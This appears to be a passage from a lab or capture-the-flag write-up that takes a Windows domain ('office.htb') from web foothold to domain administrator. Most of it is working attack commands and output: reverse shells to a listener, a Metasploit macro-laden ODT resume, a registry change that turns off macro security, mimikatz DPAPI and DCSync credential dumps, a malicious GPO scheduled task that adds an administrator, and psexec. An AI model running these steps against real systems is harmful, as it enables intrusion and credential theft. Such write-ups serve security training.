After manual site enumeration, the /resume.php endpoint was discovered with a form to submit a job application. This form included a upload whitelist that only allows Doc, Docx, Docm, and odt file formats.
![Job Application Submission](assets/images/office/jobapp-submission.png)

The tester uploaded a `.odt` open office file and searched for the file on the system through the PowerShell reverse-shell to discover the upload location.
```console?prompt=>
PS C:\> where.exe /R C:\ *.odt
C:\xampp\htdocs\internal\applications\tester-tester-it-30-000-0-5-years-tester@tester-tester.odt
```

While the tester was able to place a webshell in the upload directory, hitting it revealed it was running under the same context as the `web_account` the tester already had access to.


The tester noted that the `.odt` file disappears after some time, indicating someone(or a script) is deleting it. With this knowledge, the tester decided to create a malicious ODT file containing a macro. 

Upon further research, it was discovered that macros are blocked by default in both Word(With a warning) and OpenOffice, with OpenOffice storing the macro security level in a registry key named Value at `HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel`.


The tester enumerated all users on the machine and discovered that `tstark` is a member of the `Registry Editors` group.
```console?prompt=>
PS C:\Users\web_account\AppData\Local\Temp> net user tstark
net user tstark
User name                    tstark
Full Name                    
.......................

Local Group Memberships      
Global Group memberships     *Domain Users         *Registry Editors     
The command completed successfully.
```

Due to runas.exe requiring password input through the terminal and the tester not able to establish a fully interactive session, a powershell [RunasCs module](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1) was used.

```console?prompt=>
PS C:\Users\Public\Documents> Import-Module .\Invoke-RunasCs.ps1
PS C:\Users\Public\Documents> Invoke-RunasCs -Username tstark -Password <REDACTED> -Domain office.htb -Command "powershell.exe" -Remote 10.10.14.65:8091

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a21fa$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7996 created in background.
```

On the nc listener end, a reverse shell connection is established:
```console?prompt=$
└─$ nc -lvnp 8091 -s 10.10.14.65
listening on [10.10.14.65] 8091 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.230.226] 53590
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
office\tstark
```

The tester checks the registry value for MacroSecurityLevel and modifies it to disable security
```console?prompt=>
PS C:\Windows\system32> Get-ItemProperty -Path HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel -Name "Value"

Value        : 3
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry



PS C:\Windows\system32> New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -PropertyType DWord -Force

Value        : 0
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

The tester then uses metasploits `msfconsole` with the `openoffice_document_macro` module/exploit to generate a malicious ODT containing a macro.

```console?prompt=$
└─$ msfconsole -q 
[msf](Jobs:0 Agents:0) >> search openoffice

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/misc/openoffice_document_macro
  2017-02-08       excellent  No     Apache OpenOffice Text Document Malicious Macro Execution
<SNIP>

[msf](Jobs:0 Agents:0) >> use 0
```

The tester sets all required msfconsole options
```
[msf](Jobs:1 Agents:1) exploit(multi/misc/openoffice_document_macro) >> options

Module options (exploit/multi/misc/openoffice_document_macro):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY                       no        The message for the document body
   FILENAME  resume.odt       yes       The OpenOffice Text document name
   SRVHOST   10.10.14.65      yes       The local host or network interface to listen on. This must be an address on the loc
                                        al machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.65      yes       The listen address (an interface may be specified)
   LPORT     9099             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache OpenOffice on Windows (PSH)



View the full module info with the info, or info -d command.


[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/misc/openoffice_document_macro) >> 
[*] Started reverse TCP handler on 10.10.14.65:9099 
[*] Using URL: http://10.10.14.65:8080/C0OTh8z7MmSW
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[*] Packaging file: meta.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging file: styles.xml
[+] resume.odt stored at /home/omo/.msf4/local/resume.odt

```


The file is uploaded through the job application form.
![Job Application Upload](assets/images/office/application-upload.png)

metasploits msfconsole then caught the session
```
[+] resume.odt stored at /home/omo/.msf4/local/resume.odt
[*] 10.129.230.226   openoffice_document_macro - Sending payload
[*] Sending stage (200774 bytes) to 10.129.230.226
[*] Meterpreter session 1 opened (10.10.14.65:9099 -> 10.129.230.226:59995) at 2024-09-11 01:46:31 -0700
```


The tester then interfaced with the meterpreter session, this granted a shell session as the `office\ppotts` user:
```console?prompt=>
[msf](Jobs:1 Agents:1) exploit(multi/misc/openoffice_document_macro) >> sessions 

Active sessions
===============

  Id  Name  Type                     Information         Connection
  --  ----  ----                     -----------         ----------
  1         meterpreter x64/windows  OFFICE\ppotts @ DC  10.10.14.65:9099 -> 10.129.230.226:59995 (10.129.230.226)

[msf](Jobs:1 Agents:1) exploit(multi/misc/openoffice_document_macro) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Program Files\LibreOffice 5\program) > shell
Process 7744 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice 5\program>whoami
whoami
office\ppotts

```

The tester enumerated saved credentials via the Windows `cmdkey` binary and discovered another domain user, `hhogan` is saved.
```console?prompt=>
PS C:\Users\PPotts> cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan
```


The saved credential for the `hhogan` domain user is encrypted, and because the password for the `PPotts` is unknown, this can only be decrypted through `dpapi` with the master credentials of `PPotts`.

The tester enumerated the available master keys for the `PPotts` user
```console?prompt=>
ls -Force C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d                                 
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb                                 
-a-hs-         9/11/2024   4:23 AM            740 5cda76f4-125d-423a-82ea-07e17d4a0739                                 
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE                                                            
-a-hs-         9/11/2024   4:23 AM             24 Preferred
```

The tester then proceeded to upload the mimikatz tool and decrypt all three of the discovered master keys for the `PPotts` domain user.
```console?prompt=>
(Meterpreter 1)(C:\Users\Public\Documents) > upload Documents/tools/mimikatz.exe
[*] Uploading  : /home/omo/Documents/tools/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/omo/Documents/tools/mimikatz.exe -> mimikatz.exe
[*] Completed  : /home/omo/Documents/tools/mimikatz.exe -> mimikatz.exe

(Meterpreter 1)(C:\Users\Public\Documents) > shell
Process 7824 created.
Channel 8 created.
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

PS C:\Users\Public\Documents> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d /rpc" exit

mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

<SNIP>

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 3f891c81971ccacb02123a9dde170eaae918026ccc0a305b221d3582de4add84c900ae79f950132e4a70b0ef49dea6907b4f319c5dd10f60cc31cb1e3bc33024
  sha1: fbab11cacdd8407e8db9604f0f8c92178bee6fd3


PS C:\Users\Public\Documents> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\5cda76f4-125d-423a-82ea-07e17d4a0739 /rpc" exit

mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

<SNIP>

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 94131b901187d85c41914db9c6bb1f0bf5ed26e168df20fe0206c87eb1ee4463eb33f6e918c8fd3eba676bb5517102916941887c8bdd7511656f1a86fd3ab53a
  sha1: ffd51c034599f1404c5592e339428d95ca814a2b


C:\Users\Public\Documents>.\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit

mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

<SNIP>

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```

The tester decrypted the three present master keys:
```
key : 3f891c81971ccacb02123a9dde170eaae918026ccc0a305b221d3582de4add84c900ae79f950132e4a70b0ef49dea6907b4f319c5dd10f60cc31cb1e3bc33024
key : 94131b901187d85c41914db9c6bb1f0bf5ed26e168df20fe0206c87eb1ee4463eb33f6e918c8fd3eba676bb5517102916941887c8bdd7511656f1a86fd3ab53a
key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
```

The tester then enumerated stored credentials and discovered three encrypted stored credentials. 
```console?prompt=>
PS C:\Users\Public\Documents> ls -Force C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
ls -Force C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\


    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-         9/11/2024   9:55 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```


Using the `mimikatz` tool again, the tester attempted to decrypt each of the three credentials with each of the three decrypted master keys until the correct key-credential pair was discovered for the `HHogan` domain user.
```console?prompt=>
PS C:\Users\Public\Documents> .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : <REDACTED>
  Attributes     : 0

mimikatz(commandline) # exit
Bye
```

The tester successfully obtained the stored credentials for the `HHogan` domain user.
```
  UserName       : OFFICE\HHogan
  CredentialBlob : <REDACTED>
```

The credentials for the `HHogan` user were validated with the netexec(nxc) tool. 
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'HHogan' -p '<REDACTED>'         
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\HHogan:<REDACTED> 
```

Next, the tester then elected to run [bloodhound.py](https://github.com/dirkjanm/BloodHound.py), a collection service for the [BloodHound GUI](https://github.com/BloodHoundAD/BloodHound) application, this is an application that will use a graph database([neo4j](https://github.com/neo4j/neo4j)) to visualize user/group privileges and other relationships between various Active Directory objects such as users, groups, computers, GPOs, and more. 
```console?prompt=$
└─$ python3 bloodhound.py -u 'HHogan' -p '<REDACTED>' -ns 10.129.230.226 -d office.htb -c all --zip           
INFO: Found AD domain: office.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.office.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.office.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 13 users
INFO: Found 54 groups
INFO: Found 8 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.office.htb
INFO: Done in 00M 21S
INFO: Compressing output into 20240911231121_bloodhound.zip
```

The tester then loads the collection data into the BloodHound GUI tool and marked the compromised users: `dwolfe` ,`tstark`, `PPotts`, and `HHogan` before all possible outbound object control for each user was enumerated. 


The tester discovers that the `HHogan` user is a member of both the `REMOTE MANAGEMENT USERS` and `GPO MANAGERS` allows the user to access computers within the domain via WinRM while `GPO MANAGERS` allows writing to the `DEFAULT DOMAIN POLICY`. 
![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target.png)



Next, the tester used bloodhound to plot out a path from the compromised users to the Domain Controller, `DC.OFFICE.HTB`
![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target2.png)


Due to HHogan being a member of `GPO MANAGERS`, the user has `GenericWrite` privileges over the `Default Domain Controllers Policy` allowing for a new policy to be pushed to the GPO. This was leveraged by the tester to push a policy that triggers an immediate scheduled task. 

First the tester found the GPO file path via the BloodHound-GUI tool.
![Bloodhound GPO Path](assets/images/office/bhound-gpo-path.png)

The tester then used `smbclient.py`, a tool from the impacket suite to establish a SMB session with the `SYSVOL` share on the `DC` host before navigating to the GPO and creating `Preferences\ScheduledTasks\ScheduledTasks.xml` under the `MACHINE` directory.
```console?prompt=$,#
└─$ impacket-smbclient HHogan@10.129.230.226
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# use SYSVOL
# cd OFFICE.HTB\POLICIES\{6AC1786C-016F-11D2-945F-00C04FB984F9}
# cd MACHINE
# mkdir Preferences
# cd Preferences
# mkdir ScheduledTasks
# cd ScheduledTasks
# pwd
/OFFICE.HTB/POLICIES/{6AC1786C-016F-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks
# put ScheduledTasks.xml

```

`ScheduledTasks.xml` is a scheduled task that adds the `TesterTempUser958` and makes them a local administrator. 
```xml
└─$ cat ScheduledTasks.xml 
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="TASK_15fe98c1" image="0" changed="2024-08-13 09:18:46" uid="{D741B37D-C4DC-401A-B81C-44A3F6B75D77}" userContext="0" removePolicy="0">
        <Properties action="C" name="TASK_15fe98c1" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description>MSBuild build and release task</Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>c:\\windows\\system32\\cmd.exe</Command>
                        <Arguments>/c "net user TesterTempUser958 Pssxxxxxxxxxe22 /add &amp;&amp; net localgroup administrators TesterTempUser958 /add"</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```

Next the `GPT.INI` version is incremented to reflect a GPO change before its put back on the SMB SYSVOL share for the `Default Domain Controllers Policy`.
```console?prompt=#
# pwd
/OFFICE.HTB/POLICIES/{6AC1786C-016F-11D2-945F-00C04FB984F9}
# cat GPT.INI
[General]
Version=12
# get GPT.INI
# put GPT.INI
# cat GPT.INI
[General]
Version=13
```

The tester then used the evil-winrm tool to establish a WinRM connection the `DC` host as the `HHogan` user and force a group policy update via `gpupdate`.
```console?prompt=$
└─$ evil-winrm -i 10.129.230.226 -u 'HHogan' -p '<REDACTED>'

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

The tester, still on the WinRM connection as `HHogan` confirms the new `TesterTempUser958` user was added and has administrator privileges.
```console?prompt=>
net *Evil-WinRM* PS C:\Users\HHogan\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            dlanor                   dmichael
dwolfe                   etower                   EWhite
Guest                    HHogan                   krbtgt
PPotts                   TesterTempUser958      tstark
web_account


*Evil-WinRM* PS C:\Users\HHogan\Documents> net user TesterTempUser958
User name                    TesterTempUser958

<SNIP>

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.

```

The tester then uses impacket's psexec.py to gain a remote shell session with the DC as `nt authority\system`, fully compromising the Domain Controller.
```console?prompt=>
└─$ impacket-psexec TesterTempADUser958@10.129.230.226
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.230.226.....
[*] Found writable share ADMIN$
[*] Uploading file myAgoxWF.exe
[*] Opening SVCManager on 10.129.230.226.....
[*] Creating service YezA on 10.129.230.226.....
[*] Starting service YezA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

To even further demonstrate full compromise, the tester compromised the Domain Administrator account. To do this, the mimikatz.exe tool was uploaded via the previously established Evil-WinRM session to `C:\Users\Public\Documents` and leveraged the `nt authority\system` session from psexec.py to preform a DCSync attack and dump the Domain Administrators NTLM hash.  
```console?prompt=>
*Evil-WinRM* PS C:\Users\Public\Documents> upload Documents\tools\mimikatz.exe

Info: Uploading /home/tester/Documents/tools/mimikatz.exe to C:\Users\Public\Documents\mimikatz.exe
```

On the psexec.py session:
```console?prompt=>
C:\Users\Public\Documents> .\mimikatz.exe "lsadump::dcsync /domain:OFFICE.HTB /user:Administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:OFFICE.HTB /user:Administrator
[DC] 'OFFICE.HTB' will be the domain
[DC] 'DC.office.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00110200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD NOT_DELEGATED )
Account expiration   : 
Password last change : 5/10/2023 12:00:50 PM
Object Security ID   : S-1-5-21-1199398058-4196589450-691661856-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f5bxxxxxxxxxxxxxxxxxxxxxxxxxx05d
    ntlm- 0: f5bxxxxxxxxxxxxxxxxxxxxxxxxxx05d
    ntlm- 1: 70fxxxxxxxxxxxxxxxxxxxxxxxxxx78c
    lm  - 0: 545xxxxxxxxxxxxxxxxxxxxxxxxxxd1c

<SNIP>


mimikatz(commandline) # exit
Bye!
```

The tester also noted the same DCSync attack can be preformed from a \*nix machine with impacket's secretsdump.py
```console?prompt=$
└─$ impacket-secretsdump 'TesterTempADUser958':'Pssxxxxxxxxxe22'@'10.129.230.226' -use-vss
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x91bde78672163b8f0021027839600808
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70fxxxxxxxxxxxxxxxxxxxxxxxxxx78c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<SNIP>

[*] _SC_Apache2.4 
OFFICE\web_account:verytoughpassword123!
[*] _SC_mysql 
OFFICE\web_account:verytoughpassword123!
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85c743e6e713c675ba51cba526c43bfd
[*] Reading and decrypting hashes from \\10.129.230.226\ADMIN$\Temp\WXnZCiRm.tmp 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f5bxxxxxxxxxxxxxxxxxxxxxxxxxx05d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:0ddxxxxxxxxxxxxxxxxxxxxxxxxxxf49:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bdfxxxxxxxxxxxxxxxxxxxxxxxxxx4ed:::
PPotts:1107:aad3b435b51404eeaad3b435b51404ee:b33xxxxxxxxxxxxxxxxxxxxxxxxxx778:::
HHogan:1108:aad3b435b51404eeaad3b435b51404ee:6a6xxxxxxxxxxxxxxxxxxxxxxxxxx347:::
EWhite:1109:aad3b435b51404eeaad3b435b51404ee:385xxxxxxxxxxxxxxxxxxxxxxxxxx79b:::
etower:1110:aad3b435b51404eeaad3b435b51404ee:b02xxxxxxxxxxxxxxxxxxxxxxxxxx379:::
dwolfe:1111:aad3b435b51404eeaad3b435b51404ee:04exxxxxxxxxxxxxxxxxxxxxxxxxx9dd:::
dmichael:1112:aad3b435b51404eeaad3b435b51404ee:5dxxxxxxxxxxxxxxxxxxxxxxxxxx7d3:::
dlanor:1113:aad3b435b51404eeaad3b435b51404ee:8a3xxxxxxxxxxxxxxxxxxxxxxxxxx7a8:::
tstark:1114:aad3b435b51404eeaad3b435b51404ee:89fxxxxxxxxxxxxxxxxxxxxxxxxxxa23:::
web_account:1118:aad3b435b51404eeaad3b435b51404ee:4bdxxxxxxxxxxxxxxxxxxxxxxxxxxde25:::

<SNIP>

[*] Cleaning up...
```


